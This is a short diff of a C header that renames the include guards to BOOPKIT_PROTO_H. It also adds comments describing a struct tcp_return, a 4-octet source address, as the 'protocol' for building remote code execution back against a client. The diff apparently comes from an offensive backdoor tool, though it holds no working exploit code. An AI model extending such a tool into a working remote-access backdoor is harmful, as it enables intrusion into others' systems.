@@ -22,11 +22,23 @@
 
 #include <netinet/in.h>
 
-#ifndef ENOHONK_PROTO_H
-#define ENOHONK_PROTO_H
+#ifndef BOOPKIT_PROTO_H
+#define BOOPKIT_PROTO_H
 
+
+// tcp_return
+//
+// This is the "protocol" that allows us to begin building
+// the RCE back against a client.
+//
+// This should be kept as small as possible as we will need
+// to craft this structure for every probe we use to try to
+// boop with.
+//
+// In other words, if we can get 4 octets of "saddr" information
+// we can pwn your shit.
 struct tcp_return {
   __u8 saddr[4];
 };
 
-#endif // ENOHONK_PROTO_H
+#endif // BOOPKIT_PROTO_H
